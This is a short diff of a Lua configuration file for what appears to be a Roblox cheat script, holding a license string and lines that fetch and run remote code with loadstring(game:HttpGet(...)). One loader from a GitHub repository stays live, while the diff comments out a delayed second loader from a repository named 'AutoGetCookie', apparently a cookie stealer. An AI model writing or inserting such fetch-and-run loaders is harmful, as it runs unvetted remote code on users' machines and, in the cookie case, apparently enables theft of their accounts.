@@ -189,11 +189,9 @@ getgenv().ConfigsKaitun = {
 	},
 }
 License = "qTtCbAWlIJxw3Lp2g9gMvZomk9BuHAju"
-spawn(function()
 loadstring(game:HttpGet('https://raw.githubusercontent.com/Real-Aya/Loader/main/Init.lua'))()
-end)
 
-wait(60)
-spawn(function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ThanhTuoi852123/AutoGetCookie/refs/heads/main/asd33.lua"))()
-end)
+-- wait(60)
+-- spawn(function()
+-- loadstring(game:HttpGet("https://raw.githubusercontent.com/ThanhTuoi852123/AutoGetCookie/refs/heads/main/asd33.lua"))()
+-- end)
